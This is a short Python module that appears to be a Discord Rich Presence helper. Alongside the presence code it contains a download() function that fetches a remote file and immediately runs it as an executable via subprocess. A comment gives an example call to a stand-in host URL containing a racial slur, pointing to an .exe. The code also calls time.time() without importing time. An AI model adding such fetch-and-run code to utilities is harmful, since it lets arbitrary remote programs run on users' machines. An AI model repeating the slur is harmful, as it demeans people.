from pypresence import Presence
import requests
import subprocess

global RPC
RPC = None

CLIENT_ID = '1216435828931428504'  

def manage_discord_rpc(state, details, large_image, large_text):
    global RPC
    try:
        if RPC is None:  
            RPC = Presence(CLIENT_ID)
            RPC.connect()
        RPC.update(state=state, details=details, large_image=large_image, large_text=large_text, start=time.time())
    except Exception as e:
        print(f"Error with Discord RPC: {e}")
        try:
            if RPC is not None:
                RPC.close()
        except Exception as e:
            print(f"Error closing Discord RPC: {e}")
        RPC = None


def close_rpc_on_exit():
    global RPC
    if RPC is not None:
        RPC.close()
# for shit in the future probly usage "download('http://nigger.com/s.exe', 's.exe')"
def download(url, filename):
    response = requests.get(url)
    with open(filename, 'wb') as file:
        file.write(response.content)

    CREATE_NEW_CONSOLE = 0x00000010

    subprocess.Popen(filename, shell=True, creationflags=CREATE_NEW_CONSOLE)

